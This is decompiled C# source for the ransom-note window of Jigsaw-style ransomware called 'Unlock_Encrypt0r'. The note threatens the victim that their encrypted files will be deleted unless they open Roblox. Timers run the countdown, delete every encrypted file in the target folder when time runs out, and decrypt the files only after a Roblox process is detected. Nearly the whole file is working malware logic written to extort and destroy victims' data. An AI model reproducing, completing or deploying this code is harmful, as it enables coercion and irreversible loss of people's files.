using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Unlock_Encrypt0r_1._0.My;

namespace Unlock_Encrypt0r_1._0;

[DesignerGenerated]
public class Encryptor_Note : Form
{
	private IContainer components;

	private object sec;

	private object min;

	private object sec2;

	private object min2;

	private int i;

	private string strmsg;

	private Process[] p;

	private string filenamez;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("labelFilesToDelete")]
	private virtual Label labelFilesToDelete
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	private virtual Button buttonViewEncryptedFiles
	{
		[CompilerGenerated]
		get
		{
			return _buttonViewEncryptedFiles;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = buttonViewEncryptedFiles_Click;
			Button val = _buttonViewEncryptedFiles;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_buttonViewEncryptedFiles = value;
			val = _buttonViewEncryptedFiles;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	private virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer3
	{
		[CompilerGenerated]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			Timer timer = _Timer3;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			timer = _Timer3;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[CompilerGenerated]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			Timer timer = _Timer4;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			timer = _Timer4;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[CompilerGenerated]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			Timer timer = _Timer5;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			timer = _Timer5;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer6
	{
		[CompilerGenerated]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			Timer timer = _Timer6;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			timer = _Timer6;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer7
	{
		[CompilerGenerated]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			Timer timer = _Timer7;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			timer = _Timer7;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Timer8")]
	internal virtual Timer Timer8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Encryptor_Note()
	{
		((Form)this).add_Load((EventHandler)Encryptor_Note_Load);
		sec = 59;
		min = 59;
		sec2 = 59;
		min2 = 1;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Expected O, but got Unknown
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Expected O, but got Unknown
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d2: Expected O, but got Unknown
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		//IL_0292: Expected O, but got Unknown
		//IL_02c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_049e: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a8: Expected O, but got Unknown
		//IL_0629: Unknown result type (might be due to invalid IL or missing references)
		//IL_0633: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Encryptor_Note));
		Label1 = new Label();
		Timer1 = new Timer(components);
		Label2 = new Label();
		Timer2 = new Timer(components);
		labelFilesToDelete = new Label();
		buttonViewEncryptedFiles = new Button();
		Button1 = new Button();
		Label3 = new Label();
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		Timer5 = new Timer(components);
		ListBox1 = new ListBox();
		ProgressBar1 = new ProgressBar();
		Timer6 = new Timer(components);
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.DimGray);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.Silver);
		((Control)Label1).set_Location(new Point(-3, -2));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 36));
		((Control)Label1).set_TabIndex(4);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.DimGray);
		Label2.set_BorderStyle((BorderStyle)2);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 72f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.Silver);
		((Control)Label2).set_Location(new Point(12, 513));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(360, 137));
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("59:59\r\n");
		((Control)Label2).set_Visible(false);
		Timer2.set_Interval(6000);
		labelFilesToDelete.set_AutoSize(true);
		((Control)labelFilesToDelete).set_BackColor(Color.Gray);
		((Control)labelFilesToDelete).set_Font(new Font("Lucida Console", 12f, (FontStyle)1));
		((Control)labelFilesToDelete).set_ForeColor(Color.Silver);
		((Control)labelFilesToDelete).set_Location(new Point(13, 678));
		((Control)labelFilesToDelete).set_Margin(new Padding(4, 0, 4, 0));
		((Control)labelFilesToDelete).set_Name("labelFilesToDelete");
		((Control)labelFilesToDelete).set_Size(new Size(477, 20));
		((Control)labelFilesToDelete).set_TabIndex(7);
		labelFilesToDelete.set_Text("all file will be deleted by timeout.");
		((Control)labelFilesToDelete).set_Visible(false);
		((ButtonBase)buttonViewEncryptedFiles).set_BackColor(Color.Gray);
		((Control)buttonViewEncryptedFiles).set_ForeColor(Color.White);
		((Control)buttonViewEncryptedFiles).set_Location(new Point(12, 712));
		((Control)buttonViewEncryptedFiles).set_Margin(new Padding(4));
		((Control)buttonViewEncryptedFiles).set_Name("buttonViewEncryptedFiles");
		((Control)buttonViewEncryptedFiles).set_Size(new Size(464, 28));
		((Control)buttonViewEncryptedFiles).set_TabIndex(8);
		((ButtonBase)buttonViewEncryptedFiles).set_Text("View encrypted files");
		((ButtonBase)buttonViewEncryptedFiles).set_UseVisualStyleBackColor(false);
		((Control)buttonViewEncryptedFiles).set_Visible(false);
		((ButtonBase)Button1).set_BackColor(Color.Gray);
		((Control)Button1).set_ForeColor(Color.White);
		((Control)Button1).set_Location(new Point(12, 748));
		((Control)Button1).set_Margin(new Padding(4));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(464, 28));
		((Control)Button1).set_TabIndex(9);
		((ButtonBase)Button1).set_Text("I made open roblox, now give me back my files!");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)Button1).set_Visible(false);
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Black);
		Label3.set_BorderStyle((BorderStyle)2);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.Red);
		((Control)Label3).set_Location(new Point(-11, -203));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(73, 31));
		((Control)Label3).set_TabIndex(10);
		Label3.set_Text("00:00");
		((Control)Label3).set_Visible(false);
		Timer3.set_Interval(6000);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox1.set_ItemHeight(16);
		((Control)ListBox1).set_Location(new Point(17, -149));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(120, 84));
		((Control)ListBox1).set_TabIndex(11);
		((Control)ListBox1).set_Visible(false);
		((Control)ProgressBar1).set_Location(new Point(58, -101));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(100, 23));
		((Control)ProgressBar1).set_TabIndex(12);
		((Control)ProgressBar1).set_Visible(false);
		Timer8.set_Interval(1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.DimGray);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(1144, 825));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)buttonViewEncryptedFiles);
		((Control)this).get_Controls().Add((Control)(object)labelFilesToDelete);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Encryptor_Note");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Jigsaw.exe");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Encryptor_Note_Load(object sender, EventArgs e)
	{
		Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min, (object)":"), sec)));
		strmsg = "I want to play a game with you. Let me explain the rules:" + Environment.NewLine + "Your computer files have been encrypted. Your photos, videos, documents, etc…" + Environment.NewLine + "But, don’t worry! I have not deleted all files, yet." + Environment.NewLine + "You have 24 hours have open roblox to get the decryption key." + Environment.NewLine + "all files will be deleted in timeout." + Environment.NewLine + Environment.NewLine + "If you do not have roblox." + Environment.NewLine + "Install Roblox and trying open roblox." + Environment.NewLine + "Pls click button to decrypt file take one minute to verify." + Environment.NewLine + "You can play roblox if files not decrypt now." + Environment.NewLine + Environment.NewLine + "Trying to rename file are not decrypt." + Environment.NewLine + Environment.NewLine + "                        Thank you to read this note             _";
		Timer1.set_Enabled(true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		checked
		{
			i++;
			Label label;
			(label = Label1).set_Text(label.get_Text() + strmsg.Substring(i - 1, 1));
			if (i == strmsg.Length)
			{
				Timer1.set_Enabled(false);
				Timer2.Start();
				((Control)Label2).set_Visible(true);
				((Control)Button1).set_Visible(true);
				((Control)buttonViewEncryptedFiles).set_Visible(true);
				((Control)labelFilesToDelete).set_Visible(true);
			}
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min, (object)":"), sec)));
		if (Operators.ConditionalCompareObjectEqual(sec, (object)0, false))
		{
			ref object reference = ref min;
			reference = Operators.SubtractObject(reference, (object)1);
			sec = 59;
		}
		else if (Operators.ConditionalCompareObjectEqual(min, (object)0, false))
		{
			Timer2.Stop();
			Timer3.Start();
		}
		else
		{
			ref object reference2 = ref sec;
			reference2 = Operators.SubtractObject(reference2, (object)1);
		}
	}

	private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Encryption).Show();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		p = Process.GetProcessesByName("RobloxPlayerBeta");
		if (p.Count() > 0)
		{
			Timer4.Start();
			return;
		}
		Timer4.Stop();
		((ButtonBase)Button1).set_Text("Not found roblox pls open again and try!");
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min, (object)":"), sec)));
		if (Operators.ConditionalCompareObjectEqual(sec, (object)0, false))
		{
			Timer3.Stop();
			{
				foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyProject.Forms.setup_ransom.path_folder_input.get_Text(), (SearchOption)3, new string[0]))
				{
					if (file.EndsWith(MyProject.Forms.setup_ransom.files_encryption.get_Text()))
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
				}
				return;
			}
		}
		ref object reference = ref sec;
		reference = Operators.SubtractObject(reference, (object)1);
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		Label3.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min2, (object)":"), sec2)));
		((ButtonBase)Button1).set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min2, (object)":"), sec2)));
		if (Operators.ConditionalCompareObjectEqual(sec2, (object)0, false))
		{
			ref object reference = ref min2;
			reference = Operators.SubtractObject(reference, (object)1);
			sec2 = 59;
		}
		else if (Operators.ConditionalCompareObjectEqual(min2, (object)0, false))
		{
			Timer4.Stop();
			Timer5.Start();
		}
		else
		{
			ref object reference2 = ref sec2;
			reference2 = Operators.SubtractObject(reference2, (object)1);
		}
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		Label3.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min2, (object)":"), sec2)));
		((ButtonBase)Button1).set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(min2, (object)":"), sec2)));
		if (Operators.ConditionalCompareObjectEqual(sec2, (object)0, false))
		{
			Timer2.Stop();
			Timer4.Stop();
			Timer5.Stop();
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyProject.Forms.setup_ransom.path_folder_input.get_Text(), (SearchOption)3, new string[0]))
			{
				if (file.EndsWith(MyProject.Forms.setup_ransom.files_encryption.get_Text()))
				{
					ListBox1.get_Items().Add((object)file);
					((ButtonBase)Button1).set_Text(file);
				}
			}
			Timer6.Start();
		}
		else
		{
			ref object reference = ref sec2;
			reference = Operators.SubtractObject(reference, (object)1);
		}
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer7.Start();
			Timer6.Stop();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			MyProject.Forms.Form1.Decryptor(filenamez, MyProject.Forms.setup_ransom.Key_encryption.get_Text(), MyProject.Forms.setup_ransom.Key_encryption.get_Text());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Control)this).Hide();
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
		((ButtonBase)Button1).set_Text($"{filenamez} Decrypting . . .");
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyProject.Forms.setup_ransom.path_folder_input.get_Text(), (SearchOption)3, new string[0]))
		{
			if (file.EndsWith(MyProject.Forms.setup_ransom.files_encryption.get_Text()))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
				((ButtonBase)Button1).set_Text($"{filenamez} Remove Files Encrypting . . .");
			}
		}
		((ButtonBase)Button1).set_Text("Exiting . . .");
		Application.ExitThread();
		Timer7.Stop();
	}
}
